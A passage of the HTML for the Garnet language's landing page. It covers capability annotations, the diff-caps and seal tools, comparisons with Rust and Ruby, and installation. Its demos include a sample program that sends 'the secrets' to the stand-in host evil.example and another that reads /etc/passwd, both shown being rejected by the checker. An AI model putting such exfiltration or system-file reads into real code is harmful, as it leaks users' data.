font-size: 13px;\n    }\n    nav.top .cta { margin-left: auto; }\n    .pillars { grid-template-columns: 1fr; }\n    .features { grid-template-columns: 1fr 1fr; }\n    .code-grid { grid-template-columns: 1fr; }\n    .caps-showcase { grid-template-columns: 1fr; }\n    .convert-grid { grid-template-columns: 1fr; }\n    .numbers { grid-template-columns: 1fr 1fr 1fr; }\n    .objective-pulse { grid-template-columns: 1fr; }\n    .doc-cards { grid-template-columns: 1fr; }\n  }\n  @media (max-width: 540px) {\n    .pillar p, .pillar .name, .evidence-note code, .feature p code { overflow-wrap: anywhere; }\n    .features { grid-template-columns: 1fr; }\n    .numbers { grid-template-columns: 1fr 1fr; }\n  }\n  @media (max-width: 900px) {\n    html { scroll-padding-top: var(--nav-h, 132px); }   /* the bar wraps to two rows below 900px */\n    .nav-cue { left: 16px; right: 16px; justify-content: center; text-align: center; white-space: normal; }\n    .nav-cue-more { display: none; }\n  }\n  @media (max-width: 359px) {\n    /* Keep the bar to two rows once the bead\'s 12px is reserved — and only\n       then, so a page without JavaScript keeps today\'s spacing. The words\n       strip goes: at this width it would wrap onto the first heading. */\n    nav.top.two-step .links { gap: 8px 12px; }\n    .nav-cue { display: none; }\n  }\n  @media (pointer: coarse) {\n    nav.top .links a { padding-block: 2px; }            /* 25px targets, WCAG 2.5.8 */\n    .section-offer { min-height: 44px; }\n  }\n\n  /* Accessibility: honor reduced-motion — no starfield twinkle, no\n     float/pulse, no reveal/scroll animation. Content stays fully visible. */\n  @media (prefers-reduced-motion: reduce) {\n    *, *::before, *::after {\n      animation: none !important;\n      transition: none !important;\n      scroll-behavior: auto !important;\n    }\n    .starfield { animation: none !important; }\n    .reveal { opacity: 1 !important; transform: none !important; }\n  }\n</style>\n<noscript><style>.reveal { opacity: 1 !important; transform: none !important; }</style></noscript>\n</head>\n<body>\n<div class="starfield"></div>\n<div class="stars"></div>\n\n<nav class="top">\n  <div class="container">\n    <a class="brand" href="./" aria-label="Garnet home">GARNE<span class="accent">T</span></a>\n    <div class="links">\n      <a href="#why" data-section="why" data-page="why.html">Why</a>\n      <a href="minispec.html">Spec</a>\n      <a href="#code">Code</a>\n      <a href="#caps">Capabilities</a>\n      <a href="#install" data-section="install" data-page="getting-started.html">Install</a>\n      <a href="#try" data-section="try" data-page="playground.html">Playground</a>\n      <a href="status.html" data-section="readiness" data-page="status.html">Status</a>\n      <a href="https://github.com/Island-Dev-Crew/garnet" target="_blank" rel="noopener noreferrer">GitHub ↗</a>\n    </div>\n    <a href="getting-started.html" class="cta">Get started</a>\n  </div>\n</nav>\n\n<!-- ═════════════════════════════════════════════════════════════ HERO -->\n<section class="hero" id="top">\n  <img class="hero-plate" src="assets/garnet-hero.webp" width="1672" height="941"\n       alt="An oxidized structural lattice fused with a dark cut garnet; a dim central ember meets a single gold evidence line that runs to the edge of the frame."\n       fetchpriority="high" decoding="async">\n  <div class="hero-scrim" aria-hidden="true"></div>\n  <div class="container">\n    <div class="hero-grid">\n      <div class="hero-copy">\n        <h1 class="wordmark" aria-label="Garnet">Garne<span class="t">T</span></h1>\n        <p class="hero-line">English is how you tell an agent what to do.<br>Garnet is how anyone else can trust what it did.</p>\n        <div class="ctas">\n          <a href="getting-started.html" class="btn btn-primary">Get started <span aria-hidden="true">&rarr;</span></a>\n          <a href="#proof" class="btn btn-ghost">See what Garnet checks <span aria-hidden="true">&rarr;</span></a>\n        </div>\n      </div>\n    </div>\n  </div>\n  <div class="hero-foot">\n    <div class="container">\n      <span>no authority without evidence</span>\n      <span>research-grade · source v<!-- truth:version -->0.8.2<!-- /truth --></span>\n      <span>last tag <!-- truth:latest_tag -->v0.8.2<!-- /truth --></span>\n      <span>built by <b>Island Dev Crew</b></span>\n    </div>\n  </div>\n</section>\n\n<!-- ═══════════════════════════════════════════ PROOF — the first code -->\n<section id="proof" class="proof-sec">\n  <div class="container reveal">\n    <h3>Start here</h3>\n    <h2>Check, then <span class="accent">diff the authority</span>, then seal.</h2>\n    <p class="lead">Most language sites open with a greeting. This one opens with a rejection, because that is the product. The function below is annotated <code>@caps()</code> and calls <code>net::tcp_connect</code>; <code>garnet check</code> refuses it and exits 1. A diff then answers <em>what new authority does this change declare?</em>, and a seal writes the paperwork out of evidence that already exists.</p>\n\n    <div class="term">\n        <div class="term-bar" aria-hidden="true"><i class="dotr"></i><i class="dotr"></i><i class="dotr"></i><span>garnet 0.8.1 · fresh directory</span><span class="real">real capture</span></div>\n        <pre><span class="c">$ cat exfil.garnet</span>\n@caps()\ndef main() {\n  net::tcp_connect("evil.example:443", "the secrets")\n  0\n}\n<span class="c">$ garnet check exfil.garnet</span>\n<span class="r">caps coverage: function `main` does not declare `net` but transitively calls `net::tcp_connect` which requires it</span>\n\n1 functions checked, 1 boundary call sites, 1 diagnostics\n<span class="c">$ echo $?</span>\n<span class="r">1</span>\n\n<span class="c">$ garnet diff-caps --machine hello.garnet declared.garnet</span>\n{"schema":"garnet.diff-caps.machine/1","verdict":<span class="au">"authority-expanded"</span>,"authority_expanded":true,"capability_band":"2/5","exit_code":1,"aggregate_gained":[<span class="au">"net"</span>],…"scope":"declared-surface-only; does not prove absence of undeclared authority; bound annotations are not part of this surface"}\n\n<span class="c">$ garnet seal hello.garnet</span>\n{"_type":"https://in-toto.io/Statement/v1","subject":[{"name":"hello","digest":{"blake3":"be28668b…bf8845c2"}}],"predicateType":"https://garnet-lang.org/attestation/seal/v1",…\n<span class="g">garnet seal:</span> cosign not installed — in-toto predicate emitted UNSIGNED (wrap-don\'t-rebuild: install cosign to attest; Garnet does not sign supply-chain itself)</pre>\n    </div>\n\n    <p class="evidence-note">Captured unedited on 2026-09-02 from <code>garnet 0.8.1</code> built at main <code>fbd64bc5</code>, in a fresh directory with no <code>.garnet-cache</code>; only long JSON lines are elided with an ellipsis. The checker rejects an undeclared call reached along a named call chain from an annotated function, cycles included &mdash; that is the bound the check holds to, and the <a href="https://github.com/Island-Dev-Crew/garnet/blob/main/C_Language_Specification/GARNET_CAPABILITY_ENFORCEMENT_SCOPE.md">capability enforcement scope</a> states where it ends. <code>garnet run</code> does not invoke the checker. <a href="#try">Run check and diff-caps yourself, in the browser &rarr;</a></p>\n  </div>\n</section>\n\n<!-- ══════════════════════════════ TRY IT — the same checker, in the browser -->\n<section id="try" class="dense">\n  <div class="container reveal">\n    <div class="section-head"><h3>Try it</h3><a class="section-offer" href="playground.html">Full playground page <span aria-hidden="true">&rarr;</span></a></div>\n    <h2>The checker, <span class="accent">in your browser</span>.</h2>\n    <p class="lead">The capture above ran on a machine you have to take our word for. This one runs on yours. It is a committed WebAssembly build of Garnet\'s checker. It runs two of the capture\'s acts &mdash; check a program, and diff its declared capability surface against a baseline &mdash; plus run; sealing stays on the command line. The service worker downloads the 2.2&nbsp;MB runtime for offline use when you visit this page. The editor opens when you ask.</p>\n\n    <div class="pg-mount" id="pg-mount">\n      <a class="btn btn-primary" id="pg-load" href="playground.html">Load the checker and run it here <span aria-hidden="true">&rarr;</span></a>\n      <p class="pg-note">Choose <em>Custom source</em>, paste the five-line program from the capture above, and press <em>Check</em> &mdash; the rejection is the one you just read.</p>\n    </div>\n\n    <p class="evidence-note">Committed package: <code>garnet_wasm_bg.wasm</code> &mdash; its byte count and sha256 are recorded in <a href="playground/pkg/provenance.json">the package provenance</a>. Clean-browser proof <strong>pass</strong> (<a href="https://github.com/Island-Dev-Crew/garnet/blob/main/F_Project_Management/LAUNCH/W_PLAY_BROWSER_PROOF.json">the recorded run</a>), with <strong>zero external requests</strong> &mdash; every file it fetched is committed to this repository &mdash; and no OS host authority granted to the runtime. The capability diff is <strong>declared-surface-only</strong>: it reports what a change declares, not the absence of undeclared authority. <a href="playground.html">Open the playground on its own page &rarr;</a></p>\n  </div>\n</section>\n\n<!-- ═══════════════════════════════════════════════════════ THREE PILLARS -->\n<section id="why" class="dense">\n  <div class="container reveal">\n    <div class="section-head"><h3>The Three Pillars</h3><a class="section-offer" href="why.html">Full Why page <span aria-hidden="true">&rarr;</span></a></div>\n    <h2>Two languages, <span class="accent">one grammar</span>.</h2>\n    <p class="lead">Rust gives you mathematical rigor at the cost of cognitive load. Ruby gives you conversational beauty at the cost of runtime surprise. Garnet\'s bet is one grammar with a mode for each — a single coherent language whose <em>mode boundary is the reconciliation</em>; the automatic bridge across that boundary is specified and still deferred.</p>\n    <div class="pillars">\n      <div class="pillar rust">\n        <h3>Rust</h3>\n        <div class="name">Rigor</div>\n        <p>Mathematical correctness. Memory discipline. Zero-cost abstractions. Performance to the metal.</p>\n        <p class="caveat">The cost: lifetimes carried as a mental stack, and ceremony.</p>\n      </div>\n      <div class="pillar garnet">\n        <h3>Garnet</h3>\n        <div class="name">Reconciliation</div>\n        <p>Managed mode (def + ARC + exceptions) feels Ruby-like. Safe mode (@safe + fn + ownership + Result) feels Rust-like.</p>\n        <p class="caveat">The mode boundary is where errors and ownership meet; the automatic runtime bridge is specified and still deferred.</p>\n      </div>\n      <div class="pillar ruby">\n        <h3>Ruby</h3>\n        <div class="name">Velocity</div>\n        <p>Conversational beauty. High velocity. Joyful to read, fast to write. DSLs flow.</p>\n        <p class="caveat">The cost: ambient authority, and no compile-time net.</p>\n      </div>\n    </div>\n    <div style="margin-top:30px;display:flex;align-items:center;gap:18px;flex-wrap:wrap">\n      <a href="why.html" class="btn btn-primary">Why &mdash; The Skinny &rarr;</a>\n      <span style="font-size:.95rem;color:var(--ink-soft)">The full case for a capability-typed language in the agent era &mdash; ten reasons, the nearest neighbor, and the verified limits and open work.</span>\n    </div>\n  </div>\n</section>\n\n<!-- ═══════════════════════════════════════════════════════════ AGENT-CODE THESIS (S79) -->\n<section id="thesis-agent" class="thesis">\n  <div class="container reveal">\n    <h3>Built for code agents write and humans accept</h3>\n    <blockquote>\n      Capability security, bounded execution, and signed provenance are\n      <span class="accent">well-precedented</span> — Pony and Austral, Wasmtime\n      and eBPF, Sigstore and SLSA each do a piece well. <strong>Garnet\'s bet is\n      the integration, not the parts:</strong> one language that carries\n      capability annotations, deterministic builds, in-toto attestations, and\n      <span class="accent">capability-surface diffing</span>, aimed at\n      agent-authored code and shipping the evidence with it.<br><br>\n      The headline is <strong>diff-caps</strong>: when a dependency or an\n      agent\'s PR changes the authority the code declares, Garnet answers\n      <em>"what new program-wide authority does this change declare?"</em> in one screen, and lists per-function gains for review — turning the\n      review bottleneck (the binding constraint on accepting AI-written code)\n      into a machine-checkable diff of the declared surface.\n    </blockquote>\n  </div>\n</section>\n\n<!-- ═══════════════════════════════════════════════════════════ CODE -->\n<section id="code">\n  <div class="container reveal">\n    <h3>Side By Side</h3>\n    <h2>Same logic. <span class="accent">Three cognitive profiles.</span></h2>\n    <p class="lead">Switch between examples to see how Garnet inherits Rust\'s shape and Ruby\'s brevity. The keyword chooses the register: <code style="color:var(--gold);background:var(--bg-code);padding:2px 8px;border-radius:4px;font-family:var(--mono)">def</code> = managed, <code style="color:var(--gold);background:var(--bg-code);padding:2px 8px;border-radius:4px;font-family:var(--mono)">fn</code> = safe.</p>\n\n    <div class="tabs" role="tablist">\n      <button class="tab active" data-tab="hello">Hello, Function</button>\n      <button class="tab" data-tab="error">Error Handling</button>\n      <button class="tab" data-tab="iter">Iterator Chains</button>\n      <button class="tab" data-tab="agent">Memory-Aware Agent</button>\n    </div>\n\n    <div class="tab-panes">\n      <!-- Hello -->\n      <div class="tab-pane active" data-pane="hello">\n        <div class="code-grid">\n          <div class="code-col rust"><div class="head"><div class="swatch"></div>RUST</div>\n<pre><span class="k">fn</span> greet(name: <span class="k">&amp;</span><span class="a">str</span>)\n    -&gt; <span class="a">String</span> {\n  <span class="k">format!</span>(\n    <span class="s">"Hello, {}!"</span>, name)\n}</pre></div>\n          <div class="code-col ruby"><div class="head"><div class="swatch"></div>RUBY</div>\n<pre><span class="k">def</span> greet(name)\n  <span class="s">"Hello, #{name}!"</span>\n<span class="k">end</span></pre></div>\n          <div class="code-col garnet"><div class="head"><div class="swatch"></div>GARNET</div>\n<pre><span class="c"># Managed — Ruby feel</span>\n<span class="k">def</span> greet(name) {\n  <span class="s">"Hello, #{name}!"</span>\n}\n\n<span class="c"># Safe — Rust rigor</span>\n<span class="a">@safe</span>\n<span class="k">fn</span> greet(borrow name: <span class="a">String</span>) -&gt; <span class="a">String</span> {\n  <span class="s">"Hello, #{name}!"</span>\n}</pre></div>\n        </div>\n      </div>\n      <!-- Error -->\n      <div class="tab-pane" data-pane="error">\n        <div class="code-grid">\n          <div class="code-col rust"><div class="head"><div class="swatch"></div>RUST</div>\n<pre><span class="k">fn</span> read_config(\n  path: <span class="k">&amp;</span><span class="a">Path</span>)\n  -&gt; <span class="a">Result</span>&lt;Config, io::Error&gt; {\n  <span class="k">let</span> content =\n    fs::read_to_string(path)?;\n  serde_json::from_str(<span class="k">&amp;</span>content)\n    .map_err(convert_err)\n}</pre></div>\n          <div class="code-col ruby"><div class="head"><div class="swatch"></div>RUBY</div>\n<pre><span class="k">def</span> read_config(path)\n  content = File.read(path)\n  JSON.parse(content)\n<span class="k">rescue</span> Errno::ENOENT\n  <span class="k">nil</span>\n<span class="k">end</span></pre></div>\n          <div class="code-col garnet"><div class="head"><div class="swatch"></div>GARNET</div>\n<pre><span class="a">@caps(fs)</span>\n<span class="k">def</span> read_config(path) {\n  <span class="k">try</span> {\n    std::json::parse(\n      fs::read_file(path))\n  } <span class="k">rescue</span> e: String {\n    <span class="k">nil</span>\n  }\n}</pre></div>\n        </div>\n      </div>\n      <!-- Iterator -->\n      <div class="tab-pane" data-pane="iter">\n        <div class="code-grid">\n          <div class="code-col rust"><div class="head"><div class="swatch"></div>RUST</div>\n<pre><span class="k">let</span> names: <span class="a">Vec</span>&lt;<span class="a">String</span>&gt; =\n  users.iter()\n    .filter(|u| u.active)\n    .map(|u| u.name.clone())\n    .collect();</pre></div>\n          <div class="code-col ruby"><div class="head"><div class="swatch"></div>RUBY</div>\n<pre>names = users\n  .select(<span class="k">&amp;</span>:active)\n  .map(<span class="k">&amp;</span>:name)</pre></div>\n          <div class="code-col garnet"><div class="head"><div class="swatch"></div>GARNET</div>\n<pre><span class="c"># Pipeline style</span>\n<span class="k">let</span> names = users\n  |&gt; filter(|u| u.active)\n  |&gt; map(|u| u.name)\n\n<span class="c"># Method style</span>\n<span class="k">let</span> names = users.filter(|u| u.active).map(|u| u.name)</pre></div>\n        </div>\n      </div>\n      <!-- Agent -->\n      <div class="tab-pane" data-pane="agent">\n        <div class="code-grid">\n          <div class="code-col rust"><div class="head"><div class="swatch"></div>RUST</div>\n<pre><span class="k">use</span> some_vector_db::*;\n<span class="k">use</span> some_episodic_log::*;\n\n<span class="k">struct</span> Agent {\n  events:\n    EventLog&lt;Event&gt;,\n  facts:\n    VectorStore&lt;Fact&gt;,\n}\n\n<span class="k">impl</span> Agent {\n  <span class="c">// ...setup ceremony...</span>\n}</pre></div>\n          <div class="code-col ruby"><div class="head"><div class="swatch"></div>RUBY</div>\n<pre><span class="k">class</span> Agent\n  <span class="k">def</span> initialize\n    <span class="a">@events</span> = []\n    <span class="a">@facts</span>  = {}\n  <span class="k">end</span>\n\n  <span class="k">def</span> remember(e)\n    <span class="a">@events</span> &lt;&lt; e\n  <span class="k">end</span>\n<span class="k">end</span></pre></div>\n          <div class="code-col garnet"><div class="head"><div class="swatch"></div>GARNET</div>\n<pre><span class="k">actor</span> Agent {\n  <span class="a">memory episodic</span> events : EpisodeStore&lt;Event&gt;\n  <span class="a">memory semantic</span> facts : VectorIndex&lt;Fact&gt;\n\n  <span class="k">protocol</span> remember(e: Event) -&gt; Bool\n  <span class="k">protocol</span> recall(q: <span class="a">String</span>) -&gt; Array&lt;Fact&gt;\n\n  <span class="k">on</span> remember(e) {\n    events.append(e); <span class="k">true</span>\n  }\n}</pre></div>\n        </div>\n      </div>\n    </div>\n  </div>\n</section>\n\n<!-- ═══════════════════════════════════════════════════════ FEATURES -->\n<section>\n  <div class="container reveal">\n    <h3>Six Pillars</h3>\n    <h2>What Garnet adds <span class="accent">at the language layer</span>.</h2>\n    <p class="lead">These are not libraries. They are language and toolchain constructs — some checked by <code>garnet check</code>, some carried by the runtime or the build — and each card says how far it goes today.</p>\n\n    <div class="features">\n      <div class="feature">\n        <div class="icon">def · fn</div>\n        <h4>Dual-Mode Reconciliation</h4>\n        <p>Same grammar, two registers. Managed mode (<code>def</code>) reads like Ruby. Safe mode (<code>@safe fn</code>) reads like Rust. Automatic error and ownership bridging at the boundary is specified, not yet wired.</p>\n      </div>\n      <div class="feature">\n        <div class="icon">@safe</div>\n        <h4>Visible Mode Boundary</h4>\n        <p><code>garnet check</code> prints a call-site count, a coarse tally of the calls it walks; it is not yet a mode-aware crossing analysis. A reviewer-readable crossing log (<code>ModeAuditLog</code>) is modelled in the checker; the CLI does not write it yet.</p>\n      </div>\n      <div class="feature">\n        <div class="icon">@caps(fs)</div>\n        <h4>Capability Model</h4>\n        <p>A function declares its OS-authority budget with <code>@caps</code>. <code>garnet check</code> rejects an undeclared call reached along a named call chain from an annotated function, cycles included, and the twenty-four gated host primitives also require the program entry\'s declared budget at run time.</p>\n      </div>\n      <div class="feature">\n        <div class="icon">memory · 4</div>\n        <h4>Agent-Native Memory</h4>\n        <p>First-class <code>memory working|episodic|semantic|procedural</code> declarations, each backed by a reference store (Mnemos). Allocator integration is sequenced on the <a href="https://github.com/Island-Dev-Crew/garnet/blob/main/C_Language_Specification/MEMORY_CORE_ROADMAP.md">Memory Core roadmap</a>, not shipped. Paper VI Contribution 4.</p>\n      </div>\n      <div class="feature">\n        <div class="icon">reload</div>\n        <h4>Actor Hot Reload</h4>\n        <p><code>ActorAddress::reload</code> swaps an actor\'s behaviour in place, refuses a downgrade unless asked, and replays the messages buffered during the swap. An Ed25519 reload-authorisation module and BLAKE3 state fingerprints ship in the actor runtime; checking a signature is not yet wired into the reload path.</p>\n      </div>\n      <div class="feature">\n        <div class="icon">--sign</div>\n        <h4>Deterministic Signed Manifests</h4>\n        <p><code>garnet build --deterministic --sign &lt;keyfile&gt;</code> emits a deterministic source-provenance manifest with an Ed25519 signature, and <code>garnet verify</code> recomputes it from the source. Release binaries are checked separately, against <code>SHA256SUMS</code> and the <a href="https://github.com/Island-Dev-Crew/garnet/blob/main/docs/release-signing.md">release signing key</a>.</p>\n      </div>\n    </div>\n  </div>\n</section>\n\n<!-- ═══════════════════════════════════════════════════════ CAPS -->\n<section id="compare" class="dense">\n  <div class="container reveal">\n    <h3>Positioning</h3>\n    <h2>Rust, Ruby, Garnet — <span class="accent">side by side, claim by claim.</span></h2>\n    <p class="lead">Garnet is not claiming to replace either parent. This table is positioning, not a benchmark: where each language sits, and what Garnet\'s dual-mode design buys you. The last row stays tied to current evidence.</p>\n    <div class="install-note" style="margin:8px 0 0;padding:0;border:1px solid var(--rule);border-radius:10px;background:var(--bg-soft);overflow-x:auto;">\n      <table style="border-collapse:collapse;width:100%;font-size:13.5px;color:var(--ink-soft);min-width:680px;">\n        <tr style="color:var(--ink);">\n          <th style="text-align:left;padding:10px 14px;border-bottom:1px solid var(--rule);">Axis</th>\n          <th style="text-align:left;padding:10px 14px;border-bottom:1px solid var(--rule);">Rust</th>\n          <th style="text-align:left;padding:10px 14px;border-bottom:1px solid var(--rule);">Ruby</th>\n          <th style="text-align:left;padding:10px 14px;border-bottom:1px solid var(--rule);color:var(--gold);">Garnet</th>\n        </tr>\n        <tr><td style="padding:8px 14px;">Memory safety</td><td style="padding:8px 14px;">Compile-time ownership</td><td style="padding:8px 14px;">Runtime GC</td><td style="padding:8px 14px;color:var(--ink);">Safe mode: ownership · Managed mode: ARC (the interpreter uses reference counting today; allocator-integrated ARC is not shipped)</td></tr>\n        <tr><td style="padding:8px 14px;">Cognitive load</td><td style="padding:8px 14px;">High (lifetimes)</td><td style="padding:8px 14px;">Low</td><td style="padding:8px 14px;color:var(--ink);">Progressive — low in managed, Rust-like in safe (argued, not measured)</td></tr>\n        <tr><td style="padding:8px 14px;">Error model</td><td style="padding:8px 14px;"><code>Result&lt;T,E&gt;</code></td><td style="padding:8px 14px;">Exceptions</td><td style="padding:8px 14px;color:var(--ink);">Both; automatic bridging at the mode boundary is specified, not yet wired</td></tr>\n        <tr><td style="padding:8px 14px;">Concurrency</td><td style="padding:8px 14px;">Threads/async, Send+Sync</td><td style="padding:8px 14px;">GVL-limited</td><td style="padding:8px 14px;color:var(--ink);">Actors + <code>Sendable</code> checking</td></tr>\n        <tr><td style="padding:8px 14px;">Agent/memory primitives</td><td style="padding:8px 14px;">Library</td><td style="padding:8px 14px;">Library</td><td style="padding:8px 14px;color:var(--ink);">Language-level (working/episodic/semantic/procedural)</td></tr>\n        <tr><td style="padding:8px 14px;">Capability control</td><td style="padding:8px 14px;">External crates</td><td style="padding:8px 14px;">External gems</td><td style="padding:8px 14px;color:var(--ink);"><code>@caps(...)</code> in the language</td></tr>\n        <tr><td style="padding:8px 14px;">Reproducible builds</td><td style="padding:8px 14px;">Tooling-dependent</td><td style="padding:8px 14px;">Not a goal</td><td style="padding:8px 14px;color:var(--ink);">Manifest + Ed25519 signature contract</td></tr>\n        <tr><td style="padding:8px 14px 12px;border-top:1px solid var(--rule);">Maturity</td><td style="padding:8px 14px 12px;border-top:1px solid var(--rule);">Production</td><td style="padding:8px 14px 12px;border-top:1px solid var(--rule);">Production</td><td style="padding:8px 14px 12px;border-top:1px solid var(--rule);color:var(--ink);"><strong>Research-grade prototype (v0.x.x)</strong> — not production-complete</td></tr>\n      </table>\n    </div>\n  </div>\n</section>\n\n<!-- ═══════════════════════════════════════════════════════ CAPS -->\n<section id="caps">\n  <div class="container reveal">\n    <h3>The Capability Model</h3>\n    <h2>Read one token. <span class="accent">Know what the function declares.</span></h2>\n    <p class="lead"><code>@caps(fs)</code> is a semantic beacon: a single annotation that front-loads the function\'s declared OS-authority budget. Humans and language models can scan a file and read what each function claims, and <code>garnet check</code> rejects an undeclared call reached along a named call chain from an annotated function, cycles included.</p>\n\n    <div class="caps-showcase">\n      <div class="code-col garnet"><div class="head"><div class="swatch"></div>GARNET</div>\n<pre><span class="a">@caps(fs)</span>\n<span class="k">def</span> get_user_summary(path, id) {\n  <span class="k">let</span> data = std::json::parse(\n    fs::read_file(path))\n  <span class="k">let</span> user = data[<span class="s">"users"</span>][id]\n  <span class="s">"#{user.name}: #{user.email}"</span>\n}\n\n<span class="c"># garnet check: caps coverage:</span>\n<span class="c"># function `bad` does not declare</span>\n<span class="c"># `fs` but transitively calls</span>\n<span class="c"># `fs::read_file` which requires it</span>\n<span class="a">@caps()</span>\n<span class="k">def</span> bad() {\n  fs::read_file(<span class="s">"/etc/passwd"</span>)\n}</pre></div>\n      <div class="caps-list">\n        <div class="row">\n          <div class="tag">@caps(fs)</div>\n          <div class="desc">Filesystem read/write/list. Required by every <code>fs::*</code> primitive, and gated at run time.</div>\n        </div>\n        <div class="row">\n          <div class="tag">@caps(net)</div>\n          <div class="desc">Outbound TCP (<code>net::tcp_connect</code>, gated at run time) under a strict default policy that denies RFC1918, loopback, link-local and cloud-metadata addresses, including their IPv4-mapped, IPv4-compatible, well-known NAT64 and 6to4 spellings. Four rarer IPv6 forms and network-specific NAT64 prefixes are not caught yet (<a href="https://github.com/Island-Dev-Crew/garnet/blob/main/SECURITY.md#known-limitations">known limitations</a>). Listen and UDP are declared, not bridged.</div>\n        </div>\n        <div class="row">\n          <div class="tag">@caps(time)</div>\n          <div class="desc">Wall + monotonic clocks, sleep. Checked by <code>garnet check</code>; not gated at run time.</div>\n        </div>\n        <div class="row">\n          <div class="tag">@caps(proc)</div>\n          <div class="desc">Subprocess spawn and wait, gated at run time.</div>\n        </div>\n        <div class="row">\n          <div class="tag">@caps(env)</div>\n          <div class="desc">Environment variables (<code>std::env::get</code>/<code>set</code>/<code>vars</code>), gated at run time.</div>\n        </div>\n        <div class="row">\n          <div class="tag">@caps(ffi)</div>\n          <div class="desc">C FFI. Declared in the checker and the manifest; there is no runtime FFI path yet.</div>\n        </div>\n        <div class="row">\n          <div class="tag">@caps(*)</div>\n          <div class="desc">Wildcard trust. Managed mode only — safe-mode wildcard is a hard error.</div>\n        </div>\n      </div>\n    </div>\n  </div>\n</section>\n\n<!-- ═══════════════════════════════════════════════════════ CONVERT -->\n<section>\n  <div class="container reveal">\n    <h3>Migrate at Your Pace</h3>\n    <h2>Convert <span class="accent">Rust · Ruby · Python · Go</span> source to Garnet.</h2>\n    <p class="lead">The <code>garnet convert</code> tool is a migration assistant, not a full transpiler: it reads four deterministic source lanes and emits Garnet tagged <code>@sandbox</code> and <code>@caps()</code>, with lineage, metrics, and a human migration checklist. Those two lines are notes for the reviewer, and neither is enforced: nothing in <code>garnet run</code> treats <code>@sandbox</code> as a boundary, and a <code>@caps()</code> placed before a module does not bind the functions inside it. As emitted today the file does not pass <code>garnet check</code> &mdash; the parser rejects the <code>@sandbox</code> line &mdash; so converted code is held to a capability budget only after a reviewer annotates its functions.</p>\n    <table style="border-collapse:collapse;width:100%;margin:6px 0 14px;font-size:14px;color:var(--ink-soft);">\n      <tr style="color:var(--ink);"><th style="text-align:left;padding:8px 12px;border-bottom:1px solid var(--rule);">Tier</th><th style="text-align:left;padding:8px 12px;border-bottom:1px solid var(--rule);">What it means</th></tr>\n      <tr><td style="padding:8px 12px;"><strong style="color:var(--gold);">Active conversion</strong><br><span style="color:var(--ink-muted);">Rust · Ruby · Python · Go</span></td><td style="padding:8px 12px;">Deterministic frontends — carries ownership-like shape, module boundaries, and migration evidence with deterministic behavior.</td></tr>\n      <tr><td style="padding:8px 12px;"><strong style="color:var(--gold);">Advisory planning</strong><br><span style="color:var(--ink-muted);">JS · TS · Swift · Java · C · C++ · C# · Perl · Kotlin · Shell · SQL · Other</span></td><td style="padding:8px 12px;">Risk-first migration planning + inventory until deterministic parser/lineage support lands; explicit and human-gated.</td></tr>\n      <tr><td style="padding:8px 12px;"><strong style="color:var(--gold);">Native boundary</strong><br><span style="color:var(--ink-muted);">C · C++ · Obj-C · Asm · CUDA · platform</span></td><td style="padding:8px 12px;">Stays native behind an FFI boundary (recommended for C, C++ and the rest of this row), with declared capabilities and a generated (not self-enforced) sandbox policy where ABI and hardware behavior are source-of-truth. Garnet has no runtime FFI path yet.</td></tr>\n    </table>\n    <p class="lead" style="font-size:15px;">Backend Wasm/LLVM-style lowering is planned (pending backend evidence). The fit rule, LLM-advisory review path, and machine-readable adoption surface are detailed in the <a href="conversion-policy.html">full conversion policy →</a></p>\n\n    <div class="convert-grid">\n      <div class="code-col ruby"><div class="head"><div class="swatch"></div>RUBY — source</div>\n<pre><span class="k">def</span> parse_config(text)\n  text.split(<span class="s">"\\n"</span>).map <span class="k">do</span> |line|\n    k, v = line.split(<span class="s">"="</span>, 2)\n    [k.strip, v.strip]\n  <span class="k">end</span>.to_h\n<span class="k">end</span></pre></div>\n      <div class="code-col garnet"><div class="head"><div class="swatch"></div>GARNET — converted, then reviewer-finished</div>\n<pre><span class="a">@sandbox</span>\n<span class="a">@caps()</span>\n<span class="k">module</span> Config {\n\n<span class="k">def</span> parse_config(text) {\n  <span class="k">let</span> out = {}\n  <span class="k">for</span> line <span class="k">in</span> text.split(<span class="s">"\\n"</span>) {\n    <span class="k">let</span> parts = line.split(<span class="s">"="</span>, <span class="n">2</span>)\n    out.insert(\n      parts[<span class="n">0</span>].trim(),\n      parts[<span class="n">1</span>].trim())\n  }\n  out\n}\n\n}</pre></div>\n    </div>\n    <p class="evidence-note">The right pane is reviewer-finished, not raw tool output. <code>garnet convert</code> copies the Ruby <code>do |line| … end</code> block unchanged and leaves two migration to-dos; a reviewer rewrote the block as the <code>for</code> loop shown. The <code>@sandbox</code> line is the tool\'s, and with it removed this file passes <code>garnet check</code>.</p>\n\n    <div class="lang-badges">\n      <div class="lang-badge">Active conversion: Rust · Ruby · Python · Go</div>\n      <div class="lang-badge">Advisory planning: JS · TS · Swift · Java · C · C++ · C# · Perl · Kotlin · Shell · SQL · Other</div>\n      <div class="lang-badge">Native boundary: C · C++ · Objective-C · Assembly · CUDA · platform-specific code</div>\n      <div class="lang-badge">Backend lowering: Wasm · LLVM-style native targets planned</div>\n      <div class="lang-badge">Adoption surface: evidence-backed</div>\n    </div>\n    <p class="evidence-note">Adoption surface evidence is machine-readable through <code>scripts/garnet_adoption_surface_status.py</code>. It keeps the provider-neutral prompt pack, provider-option registry, and advisory flow bounded: source classifier -> risk inventory -> Garnet context -> advisory plan -> review handoff -> human-approved candidate -> garnet check/test/dogfood.</p>\n  </div>\n</section>\n\n<!-- ═══════════════════════════════════════════════════════ INSTALL -->\n<section id="install">\n  <div class="container reveal">\n    <div class="section-head"><h3>Get Garnet</h3><a class="section-offer" href="getting-started.html">Getting Started guide <span aria-hidden="true">&rarr;</span></a></div>\n    <h2>Install with one curl command.</h2>\n    <p class="lead">The installer targets the <strong>v0.8.2 release</strong>. It installs the release asset for your platform, verifies it against <code>SHA256SUMS</code>, and falls back to a source install through <code>cargo install --locked</code> only when no asset matches. The v0.8.2 GitHub Release ships CLI binaries for macOS, Linux (x86_64 and ARM64) and Windows, plus a CycloneDX SBOM; productization gates are on the <a href="status.html">readiness status page</a>.</p>\n\n    <div id="os-detect" hidden style="display:none;align-items:center;gap:12px;margin:0 0 18px;padding:12px 16px;border:1px solid var(--rule);border-radius:10px;background:var(--bg-soft);font-size:14px;color:var(--ink-soft);">\n      <span id="os-detect-msg"></span>\n      <button id="os-detect-x" type="button" aria-label="Dismiss" style="margin-left:auto;background:none;border:0;color:var(--ink-muted);font-size:18px;line-height:1;cursor:pointer;padding:0 2px;">×</button>\n    </div>\n    <script>\n    (function(){\n      try{\n        var el=document.getElementById(\'os-detect\');\n        var msg=document.getElementById(\'os-detect-msg\');\n        var 